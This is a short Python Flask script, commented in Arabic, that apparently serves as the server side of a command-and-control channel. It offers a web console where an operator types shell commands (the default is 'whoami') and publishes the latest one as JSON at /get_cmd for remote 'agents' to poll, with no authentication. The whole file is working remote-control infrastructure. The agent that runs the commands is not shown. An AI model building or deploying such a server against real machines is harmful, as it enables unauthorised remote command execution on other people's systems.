from flask import Flask, request, jsonify, render_template_string
from datetime import datetime

app = Flask(__name__)

# مخزن الأمر الحالي
last_command = {
    "id": "1",
    "cmd": "whoami",
    "time": ""
}

HTML = """
<!DOCTYPE html>
<html>
<head><title>Command Sender</title></head>
<body style="background:#000; color:#0e0; font-family:monospace; padding:50px;">
    <h2>Console: Send Command to Agent</h2>
    <form method="POST">
        <input type="text" name="cmd" style="width:300px; background:#111; color:#0e0; border:1px solid #0e0;">
        <button type="submit" style="background:#0e0; color:#000;">SEND</button>
    </form>
    <p>Last Command: {{ cmd }} (ID: {{ id }})</p>
</body>
</html>
"""

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        last_command['cmd'] = request.form.get('cmd')
        last_command['id'] = str(datetime.now().timestamp()) # ID فريد بناءً على الوقت
    return render_template_string(HTML, cmd=last_command['cmd'], id=last_command['id'])

@app.route('/get_cmd')
def get_cmd():
    return jsonify(last_command)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
